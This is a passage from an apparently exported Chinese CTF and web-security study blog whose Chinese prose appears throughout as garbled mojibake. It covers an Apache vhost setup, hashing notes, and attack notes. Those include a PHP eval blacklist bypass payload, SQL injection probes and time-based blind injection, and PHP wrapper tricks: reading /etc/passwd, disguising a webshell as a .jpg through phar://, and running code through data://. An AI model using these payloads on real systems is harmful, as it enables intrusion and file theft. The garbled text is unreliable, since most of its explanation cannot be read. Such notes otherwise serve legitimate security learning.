DOMAINï¼Œä½ç½®/Windows/system32/drivers/etc/hostsæ–‡ä»¶åœ¨æœ¬æœºä»£è¡¨æœ¬æœºdns<br>vhostæ–‡ä»¶ä»£è¡¨äº†apacheé…ç½®çš„è™šæ‹Ÿç½‘ç«™ã€‚å³åŒä¸€ä¸»æœºçš„å¤šä¸ªç½‘ç«™ï¼Œéœ€è¦é…ç½®æ ¹ç›®å½•ï¼ŒåŸŸåï¼Œç«¯å£ç­‰ä¿¡æ¯ã€‚</p><img src="http://cdn.polowong.top/static/images/vh1.jpg"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line">    DocumentRoot <span class="string">&quot;E:/phpstudy_pro/WWW/dura.box&quot;</span></span><br><span class="line">    ServerName dora.box</span><br><span class="line">    ServerAlias </span><br><span class="line">    FcgidInitialEnv PHPRC <span class="string">&quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts&quot;</span></span><br><span class="line">    AddHandler fcgid-script .php</span><br><span class="line">    FcgidWrapper <span class="string">&quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot;</span> .php</span><br><span class="line">  &lt;<span class="built_in">Directory</span> <span class="string">&quot;E:/phpstudy_pro/WWW/dura.box&quot;</span>&gt;</span><br><span class="line">      Options FollowSymLinks ExecCGI</span><br><span class="line">      AllowOverride All</span><br><span class="line">      Order allow,deny</span><br><span class="line">      Allow <span class="keyword">from</span> all</span><br><span class="line">      <span class="keyword">Require</span> all granted</span><br><span class="line">  DirectoryIndex index.php index.html <span class="built_in">error</span>/index.html</span><br><span class="line">  &lt;/<span class="built_in">Directory</span>&gt;</span><br><span class="line">  ErrorDocument <span class="number">400</span> /<span class="built_in">error</span>/<span class="number">400</span>.html</span><br><span class="line">  ErrorDocument <span class="number">403</span> /<span class="built_in">error</span>/<span class="number">403</span>.html</span><br><span class="line">  ErrorDocument <span class="number">404</span> /<span class="built_in">error</span>/<span class="number">404</span>.html</span><br><span class="line">  ErrorDocument <span class="number">500</span> /<span class="built_in">error</span>/<span class="number">500</span>.html</span><br><span class="line">  ErrorDocument <span class="number">501</span> /<span class="built_in">error</span>/<span class="number">501</span>.html</span><br><span class="line">  ErrorDocument <span class="number">502</span> /<span class="built_in">error</span>/<span class="number">502</span>.html</span><br><span class="line">  ErrorDocument <span class="number">503</span> /<span class="built_in">error</span>/<span class="number">503</span>.html</span><br><span class="line">  ErrorDocument <span class="number">504</span> /<span class="built_in">error</span>/<span class="number">504</span>.html</span><br><span class="line">  ErrorDocument <span class="number">505</span> /<span class="built_in">error</span>/<span class="number">505</span>.html</span><br><span class="line">  ErrorDocument <span class="number">506</span> /<span class="built_in">error</span>/<span class="number">506</span>.html</span><br><span class="line">  ErrorDocument <span class="number">507</span> /<span class="built_in">error</span>/<span class="number">507</span>.html</span><br><span class="line">  ErrorDocument <span class="number">510</span> /<span class="built_in">error</span>/<span class="number">510</span>.html</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„åŸŸådura.boxå…¶å®æˆ‘å¹¶æ²¡æœ‰æ³¨å†Œï¼Œæˆ‘è¿™æ ·å†™åªæ˜¯ä¸ºäº†ä¾¿æ·è®¿é—®ã€‚ä¿®æ”¹æœ¬åœ°dnsæ–‡ä»¶ï¼Œæ·»åŠ è®°å½• 127.0.0.1 dura.box ç„¶åcmd ipconfig/flushdnsåˆ·æ–°æœ¬åœ°dnsç¼“å­˜<br>é‡å¯apacheæœåŠ¡ï¼Œä¸‹æ¬¡è®¿é—®dura.boxçš„æ—¶å€™å°±ç›¸å½“äºè®¿é—®æ ¹ç›®å½•ä¸ºE:/phpstudy_pro/WWW/dura.box/çš„ç½‘ç«™ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200410å­¦ä¹ ç¬”è®°</title>
      <link href="2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»Šå¤©ç¡äº†12ä¸ªå°æ—¶ã€‚ã€‚ç¦»è°±å„¿ã€‚"><a href="#ä»Šå¤©ç¡äº†12ä¸ªå°æ—¶ã€‚ã€‚ç¦»è°±å„¿ã€‚" class="headerlink" title="ä»Šå¤©ç¡äº†12ä¸ªå°æ—¶ã€‚ã€‚ç¦»è°±å„¿ã€‚"></a>ä»Šå¤©ç¡äº†12ä¸ªå°æ—¶ã€‚ã€‚ç¦»è°±å„¿ã€‚</h1><p>æ•´ç†ä¸€ä¸‹è¿™ä¸¤å¤©åšçš„é¢˜ä»¥åŠå­¦çš„å†…å®¹å§ æˆ‘è¿™ä¸¤å¤©ç¡å¾—è¿™ä¹ˆä¹…æ˜¯çœŸç¦»è°±ï¼ï¼</p><h2 id="php-strstr"><a href="#php-strstr" class="headerlink" title="php strstr()"></a>php strstr()</h2><p>strstr(str1,str2)<br>è¿”å›ä»str2ç¬¬ä¸€æ¬¡å‡ºç°å¼€å§‹ä¹‹åçš„å†…å®¹ï¼ˆåŒ…æ‹¬str2)<br>æ¯”å¦‚ strstr(â€œphpinputâ€,â€inâ€)<br>â€“ input</p><h2 id="phpå­—ç¬¦ä¸²è§£æbypass"><a href="#phpå­—ç¬¦ä¸²è§£æbypass" class="headerlink" title="phpå­—ç¬¦ä¸²è§£æbypass"></a>phpå­—ç¬¦ä¸²è§£æbypass</h2><p>å‰å¤©åšäº†ä¸ªphpå­—ç¬¦ä¸²è§£æçš„é—®é¢˜ï¼ˆbuuoj</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]; </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123; </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¼ num=phpinfo()çš„è¯æ˜¯ä¸è¡Œçš„ï¼Œæœ‰wafã€‚<br>wafçš„è§„åˆ™å¦‚æœæ˜¯è§„å®šnumåªèƒ½æ˜¯æ•°å­—çš„è¯ï¼Œç»™numä¼ ä¸ªå­—æ¯å°±ç™½ç»™äº†ã€‚<br>è¿™é‡Œå°±ç”¨åˆ°äº†phpå­—ç¬¦ä¸²è§£ææ¼æ´äº†ã€‚<br>å‚è€ƒé“¾æ¥<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a><br>ä¼ ä¸€ä¸ª?%20num=phpinfo()çš„è¯ï¼Œwafæ‰¾ä¸åˆ°numè¿™ä¸ªå‚æ•°ï¼Œè€Œphpè¿˜æ˜¯å¯ä»¥æŠŠ%20numè¯†åˆ«æˆnumçš„ã€‚æ‰€ä»¥å¯ä»¥é¡ºåˆ©çš„åˆ°evalé‚£ã€‚<br>payload: ?%20num=var_dump(scandir(chr(47))) //chr47æ˜¯/ ä»£è¡¨æ ¹ç›®å½• æ‰¾åˆ°flagæ–‡ä»¶ ç„¶åfile_get_contents(dir+filename)è¿›è¡Œè¯»å–å³å¯ã€‚è¿™é‡Œè¿‡æ»¤äº†/ï¼Œæ‰€ä»¥ç”¨chr(47)ä»£æ›¿</p><h2 id="mysql-if"><a href="#mysql-if" class="headerlink" title="mysql if()"></a>mysql if()</h2><p>IF(expr1,expr2,expr3)ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºtrueï¼Œåˆ™è¿”å›expr2çš„å€¼ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºfalseï¼Œ<br>åˆ™è¿”å›expr3çš„å€¼ã€‚<br>æ¯”å¦‚ if(2&gt;1,1,0)</p><h2 id="mysql-æ³¨é‡Š"><a href="#mysql-æ³¨é‡Š" class="headerlink" title="mysql æ³¨é‡Š"></a>mysql æ³¨é‡Š</h2><p>#æˆ–è€…â€“ å¦‚æœä½¿ç”¨â€“çš„è¯åé¢éœ€è¦ä¸€ä¸ªé—´éš”ç¬¦ å¦åˆ™çš„è¯ä¼šè¢«è¯†åˆ«ä¸º+å·ã€‚æ¯”å¦‚â€“+ ï¼ˆåœ¨urlä¸­ +æ˜¯ç©ºæ ¼çš„urlç¼–ç ï¼‰</p><img src="http://cdn.polowong.top/static/images/comm.jpg"><h2 id="sqlæ³¨å…¥æ•´å‹ã€å­—ç¬¦å‹åˆ¤æ–­"><a href="#sqlæ³¨å…¥æ•´å‹ã€å­—ç¬¦å‹åˆ¤æ–­" class="headerlink" title="sqlæ³¨å…¥æ•´å‹ã€å­—ç¬¦å‹åˆ¤æ–­"></a>sqlæ³¨å…¥æ•´å‹ã€å­—ç¬¦å‹åˆ¤æ–­</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/puhk/p/12674740.html">https://www.cnblogs.com/puhk/p/12674740.html</a><br>ä¸¾ä¾‹:<br><a href="http://xxx/xxx/Less-1/?id=1">http://xxx/xxx/Less-1/?id=1</a> and 1=1 â€“+<br>è¾“å…¥?id=1 and 1=1 â€“+æ­£å¸¸ï¼Œè¾“å…¥?id=1 and 1=2 â€“+æŠ¥é”™ï¼Œå¯åˆ¤æ–­ä¸ºæ•´å‹æ³¨å…¥ã€‚<br><a href="http://xxx.xxx/Less-1/?id=1&#39;">http://xxx.xxx/Less-1/?id=1&#39;</a><br>è¾“å…¥?id=1â€™å‡ºç°æŠ¥é”™,è¾“å…¥?id=1â€™â€™æ­£å¸¸ï¼Œå¯åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚<br><a href="http://xxx.xxx/Less-1/?id=1&#39;">http://xxx.xxx/Less-1/?id=1&#39;</a> and 1=1 â€“ -<br>è¾“å…¥?id=1â€™ and 1=1 â€“ -æ­£å¸¸ï¼Œè¾“å…¥?id=1â€™ and 1=2 â€“ -æŠ¥é”™ï¼Œå¯åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚ </p><h2 id="mysqlç›²æ³¨åˆæ­¥"><a href="#mysqlç›²æ³¨åˆæ­¥" class="headerlink" title="mysqlç›²æ³¨åˆæ­¥"></a>mysqlç›²æ³¨åˆæ­¥</h2><p>å‚è€ƒé“¾æ¥ <a href="https://www.anquanke.com/post/id/170626">https://www.anquanke.com/post/id/170626</a><br>ç›²æ³¨åˆ†ä¸ºåŸºäºæ—¶é—´çš„ç›²æ³¨å’ŒåŸºäºboolçš„ç›²æ³¨ã€‚<br>åŸºäºæ—¶é—´çš„ç›²æ³¨å°±æ˜¯æ ¹æ®åˆ¤æ–­æ¡ä»¶è¿”å›æ˜¯trueè¿˜æ˜¯false è¿›è¡Œèƒ½å¤Ÿåˆ¤æ–­çš„æ“ä½œï¼ˆæ¯”å¦‚sleepï¼‰ å¯ä»¥ç†è§£ä¸ºä¸€ç§fuzzã€‚<br>if(substr(database(),1,1)==97,sleep(1),0) å¯ä»¥å†™è„šæœ¬è·‘å‡ºæ¥æ•°æ®åº“çš„åå­—ç­‰ç­‰<br>å¸ƒå°”ç›²æ³¨æ˜¯æ ¹æ®ç»“æœè¿”å›å€¼ï¼ˆå¯¹åº”true false ï¼‰åˆ¤æ–­éœ€è¦æ‰¾çš„å­—æ®µ ç„¶åè¿›è¡Œçˆ†ç ´</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200408å­¦ä¹ ç¬”è®°</title>
      <link href="2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><del>ä»Šå¤©æœ¬æ¥æƒ³æ™šä¸Šæ•´ç†phpä¼ªåè®®çš„ ä½†æ˜¯æ—©æ™¨èµ·æ™šäº†ã€‚ã€‚ä¸‹åˆèµ·æ™šäº†ã€‚ã€‚æ™šä¸Šå¼„å®éªŒæŠ¥å‘Šçš„ç¯å¢ƒå¼„äº†ä¸€æ™šä¸Šã€‚ã€‚å¤ªç¦»è°±äº†ï¼Œæ˜å¤©å†è¯¦ç»†çš„å†™ä¼ªåè®®å§ã€‚</del><br><del>æˆ‘ä»Šå¤©ä¹Ÿèµ·æ™šäº†ï¼ï¼</del><br>åºŸè¯å°‘è¯´ å¼€å§‹ä»Šå¤©çš„phpä¼ªåè®®æ€»ç»“</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.jianshu.com/p/0a8339fcc269">https://www.jianshu.com/p/0a8339fcc269</a></p><p>php://filterï¼šåœ¨allow_url_fopenï¼Œallow_url_includeéƒ½å…³é—­çš„æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºè¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºã€‚<br>egï¼šphp://filter/convert.base64-encode/resource=xxx.php<br>php://input: è·å–post data<br>file://ï¼šç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“ï¼Œfile://è¿˜ç»å¸¸å’Œcurlå‡½æ•°(SSRF)ç»“åˆåœ¨ä¸€èµ·ã€‚<br>egï¼šfile:///etc/passwd<br>phar://ï¼šPHP å½’æ¡£ï¼Œå¸¸å¸¸è·Ÿæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ç»“åˆç€è€ƒå¯Ÿã€‚å½“æ–‡ä»¶ä¸Šä¼ ä»…ä»…æ ¡éªŒmimeç±»å‹ä¸æ–‡ä»¶åç¼€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œåˆ©ç”¨ã€‚<br>nac.php(æœ¨é©¬)-&gt;å‹ç¼©-&gt;nac.zip-&gt;æ”¹åç¼€-&gt;nac.jpg-&gt;ä¸Šä¼ -&gt;phar://nac.jpg/nac.php<br>data://ï¼šéœ€æ»¡è¶³allow_url_fopenï¼Œallow_url_includeåŒæ—¶å¼€å¯æ‰èƒ½ä½¿ç”¨ï¼Œä½¿ç”¨å¦‚ä¸‹ï¼š<br>data://å¾ˆå¸¸ç”¨çš„æ•°æ®æµæ„é€ å™¨ï¼Œå°†è¯»å–åé¢baseç¼–ç å­—ç¬¦ä¸²åè§£ç çš„æ•°æ®ä½œä¸ºæ•°æ®æµçš„è¾“å…¥<br>file.php?file=data://text/plain,<?php phpinfo()?><br>file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200406å­¦ä¹ ç¬”è®°</title>
      <link href="2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»Šå¤©åˆç¡äº†è€ä¹…ã€‚ã€‚æ™šä¸Šæ•´ç†ä¸€ä¸‹"><a href="#ä»Šå¤©åˆç¡äº†è€ä¹…ã€‚ã€‚æ™šä¸Šæ•´ç†ä¸€ä¸‹" class="headerlink" title="ä»Šå¤©åˆç¡äº†è€ä¹…ã€‚ã€‚æ™šä¸Šæ•´ç†ä¸€ä¸‹"></a>ä»Šå¤©åˆç¡äº†è€ä¹…ã€‚ã€‚æ™šä¸Šæ•´ç†ä¸€ä¸‹</h2><p>å…¶å®ä»Šå¤©æ•´ç†è¿™ä¸ªä¸€æ–¹é¢æ˜¯ä¸ä¼šï¼Œå¦ä¸€æ–¹é¢æ˜¯çœ‹åˆ°å¿ƒä»ªå¤§å­¦å¤ä»¤è¥é¢è¯•æœ‰é—®è¿‡è¿™ä¸ªé—®é¢˜ï¼ˆç”Ÿæ—¥æ”»å‡»ï¼‰ï¼Œæˆ–è®¸å¯èƒ½ä¸ä¼šå†é—®äº†ï¼Œä½†çŸ¥é“æ€»æ¯”ä¸çŸ¥é“å¼ºï¼<br>ä¸€ä¸‹å†…å®¹é™¤webshellå’Œphpå¤–çš†ä¸ºç”Ÿæ—¥æ”»å‡»è¡ç”Ÿå‡ºæ¥çš„é—®é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´æ²¡æŒæ¡çš„ï¼‰<br>ä»Šæ—¥å†…å®¹ï¼šMD5ç¢°æ’âˆšï¼Œç”Ÿæ—¥æ”»å‡»âˆšï¼Œå“ˆå¸Œâˆšï¼Œå½©è™¹è¡¨âˆšï¼Œç›âˆšï¼Œwebshellæœ¬è´¨ï¼ŒphpæŸæ–¹æ³•âˆšï¼Œå¹»æ•°âˆšï¼Œå†…å­˜å­˜å‚¨æ–¹å¼âˆš<br>å‚è€ƒï¼š<br><a href="https://www.zhihu.com/question/20820286">https://www.zhihu.com/question/20820286</a><br><a href="https://zhuanlan.zhihu.com/p/37165658">https://zhuanlan.zhihu.com/p/37165658</a><br><a href="https://blog.csdn.net/M_mamba/article/details/103405022">https://blog.csdn.net/M_mamba/article/details/103405022</a><br><a href="https://zhuanlan.zhihu.com/p/43994479">https://zhuanlan.zhihu.com/p/43994479</a><br><a href="https://www.jianshu.com/p/732d9d960411">https://www.jianshu.com/p/732d9d960411</a><br><a href="https://blog.csdn.net/blade2001/article/details/6341078">https://blog.csdn.net/blade2001/article/details/6341078</a></p><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>å“ˆå¸Œç®—æ³•ä¹Ÿæˆä¸ºæ•£åˆ—ç®—æ³•ï¼Œå¯ä»¥é€šè¿‡å“ˆå¸Œç®—æ³•å•å‘æ±‚å¾—æŸå€¼ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œå¯ä»¥æ­£å‘å¿«é€Ÿæ±‚å¾—è¯¥å€¼ï¼Œå¹¶ä¸”ä¸èƒ½é€šè¿‡è¯¥å€¼è¿˜åŸå‡ºåŸæ•°æ®ï¼›åŸæ•°æ®å³ä½¿å˜åŒ–å¾ˆå°ï¼Œå¾—åˆ°çš„æ•°æ®å˜åŒ–ä¹Ÿæ¯”è¾ƒå¤§ã€‚<br>å“ˆå¸Œç®—æ³•å¯ç”¨æ¥éªŒè¯ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®æ˜¯å¦è¢«ç¯¡æ”¹ã€‚<br>hashç®—æ³•ä¸ç†æƒ³çš„æƒ…å†µï¼šå­˜åœ¨å†²çªã€‚å³å¤šä¸ªåŸå§‹æ•°æ®å¯¹åº”ä¸€ä¸ªç›®æ ‡å€¼ï¼šh(a)=h(b)=kã€‚åœ¨æ•°å­¦ä¸Šå‡½æ•°å¿…ç„¶å¯é€†ï¼Œä¸”hashå‡½æ•°å€¼åŸŸæœ‰é™ï¼Œæ¯”å¦‚128bitMD5çš„å€¼åŸŸä¸º2<sup>128</sup>=16<sup>32</sup>(ç¬¬ä¸€æ¬¡æˆ‘ç«Ÿç„¶ç®—é”™äº†2333 ,2exp28å’Œ32exp16æ€ä¹ˆä¹Ÿå¯¹ä¸ä¸Šã€‚æˆ‘å¤ªèœäº†)<br>å“ˆå¸Œç®—æ³•å¸¸è§çš„æœ‰ï¼šMD5 SHA-1(Secure Hash Algorithm,SHA) SHA-2* SHA512ã€‚ç›®å‰MD5,SHA-1å·²ç»ä¸å®‰å…¨ã€‚<br>è¿™æ ·å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚åœ¨åˆ†å‘sessionçš„æ—¶å€™å¦‚æœç”¨hashè®¡ç®—ï¼Œå¦‚æœä¸¤ç”¨æˆ·sessionå€¼ç›¸åŒçš„è¯ï¼Œä¼šå¯¼è‡´è¶Šæƒæ“ä½œã€‚<br>MD5çš„é•¿åº¦ä¸º128bitï¼Œsha1é•¿åº¦ä¸º160bitï¼Œsha256ä¸º256bit,sha512ä¸º512bitã€‚</p><h3 id="hashå†²çªå¤„ç†æ–¹æ³•"><a href="#hashå†²çªå¤„ç†æ–¹æ³•" class="headerlink" title="hashå†²çªå¤„ç†æ–¹æ³•"></a>hashå†²çªå¤„ç†æ–¹æ³•</h3><p>MD5ç®—å‡ºæ¥å•¥å°±æ˜¯å•¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å†²çªï¼Œæ­¤å¤„è®¨è®ºçš„å†²çªæ˜¯å­˜æ”¾çš„æ—¶å€™çš„å†²çªå¤„ç†ï¼</p><h4 id="å¼€æ”¾å®šå€æ³•"><a href="#å¼€æ”¾å®šå€æ³•" class="headerlink" title="å¼€æ”¾å®šå€æ³•"></a>å¼€æ”¾å®šå€æ³•</h4><h5 id="çº¿æ€§æ¢æµ‹æ³•"><a href="#çº¿æ€§æ¢æµ‹æ³•" class="headerlink" title="çº¿æ€§æ¢æµ‹æ³•"></a>çº¿æ€§æ¢æµ‹æ³•</h5><h5 id="çº¿æ€§è¡¥å¿æ¢æµ‹æ³•"><a href="#çº¿æ€§è¡¥å¿æ¢æµ‹æ³•" class="headerlink" title="çº¿æ€§è¡¥å¿æ¢æµ‹æ³•"></a>çº¿æ€§è¡¥å¿æ¢æµ‹æ³•</h5><h5 id="çº¿æ€§éšæœºæ³•"><a href="#çº¿æ€§éšæœºæ³•" class="headerlink" title="çº¿æ€§éšæœºæ³•"></a>çº¿æ€§éšæœºæ³•</h5><h4 id="æ‹‰é“¾æ³•"><a href="#æ‹‰é“¾æ³•" class="headerlink" title="æ‹‰é“¾æ³•"></a>æ‹‰é“¾æ³•</h4><h4 id="å¤šæ¬¡hash"><a href="#å¤šæ¬¡hash" class="headerlink" title="å¤šæ¬¡hash"></a>å¤šæ¬¡hash</h4><h4 id="è®¾ç«‹å…¬å…±æº¢å‡ºåŒº"><a href="#è®¾ç«‹å…¬å…±æº¢å‡ºåŒº" class="headerlink" title="è®¾ç«‹å…¬å…±æº¢å‡ºåŒº"></a>è®¾ç«‹å…¬å…±æº¢å‡ºåŒº</h4><h2 id="å¹»æ•°ä¸å†…å­˜å­˜å‚¨æ–¹å¼"><a href="#å¹»æ•°ä¸å†…å­˜å­˜å‚¨æ–¹å¼" class="headerlink" title="å¹»æ•°ä¸å†…å­˜å­˜å‚¨æ–¹å¼"></a>å¹»æ•°ä¸å†…å­˜å­˜å‚¨æ–¹å¼</h2><p>å…¶å®å†…å­˜å­˜å‚¨æ–¹å¼æ˜¯å¤§ä¸€å­¦çš„ã€‚ã€‚è¿˜æ˜¯æ¯”è¾ƒæ„Ÿè°¢ç‹è€å¸ˆã€‚ã€‚è™½ç„¶è€å¿µpptï¼Œä½†æ˜¯é—®é—®é¢˜è¿˜æ˜¯å¾ˆçƒ­å¿ƒçš„å¸®æˆ‘è§£å†³ã€‚è°¢è°¢è°¢è°¢<br>å¹»æ•°å°±æ˜¯å¸¸ç”¨çš„æ•°ã€‚MD5çš„å››ä¸ªå¹»æ•°ABCDåˆ†åˆ«æ˜¯ï¼ˆhexï¼‰ï¼š<br>A: 01 23 45 67<br>B: 89 ab cd ef<br>C: fe dc ba 98<br>D: 76 54 32 10<br>è®¡ç®—æœºç¡¬ä»¶æœ‰ä¸¤ç§å‚¨å­˜æ•°æ®çš„æ–¹å¼ï¼šå¤§ç«¯å­—èŠ‚åºï¼ˆbig endianï¼‰å’Œå°ç«¯å­—èŠ‚åºï¼ˆlittle endianï¼‰ã€‚<br>å¤§ç«¯å­—èŠ‚åºï¼šé«˜ä½å­—èŠ‚åœ¨å‰ï¼Œä½ä½å­—èŠ‚åœ¨åï¼Œè¿™æ˜¯äººç±»è¯»å†™æ•°å€¼çš„æ–¹æ³•ã€‚<br>å°ç«¯å­—èŠ‚åºï¼šä½ä½å­—èŠ‚åœ¨å‰ï¼Œé«˜ä½å­—èŠ‚åœ¨åï¼Œå³ä»¥0x1122å½¢å¼å‚¨å­˜ã€‚<br>æ¯”å¦‚ç”¨å¤§ç«¯å­—èŠ‚åºå­˜0x01234567çš„è¯å°±æ˜¯ 01 23 45 67<br>å°ç«¯çš„è¯å°±æ˜¯ 67 45 23 01</p><h2 id="ç”Ÿæ—¥æ”»å‡»-amp-amp-å½©è™¹è¡¨-amp-amp-salt"><a href="#ç”Ÿæ—¥æ”»å‡»-amp-amp-å½©è™¹è¡¨-amp-amp-salt" class="headerlink" title="ç”Ÿæ—¥æ”»å‡»&amp;&amp;å½©è™¹è¡¨&amp;&amp;salt"></a>ç”Ÿæ—¥æ”»å‡»&amp;&amp;å½©è™¹è¡¨&amp;&amp;salt</h2><p>ç”Ÿæ—¥é—®é¢˜ï¼šä¸€ä¸ªç­çº§éœ€è¦æœ‰å¤šå°‘äººï¼Œæ‰èƒ½ä¿è¯æ¯ä¸ªåŒå­¦çš„ç”Ÿæ—¥éƒ½ä¸ä¸€æ 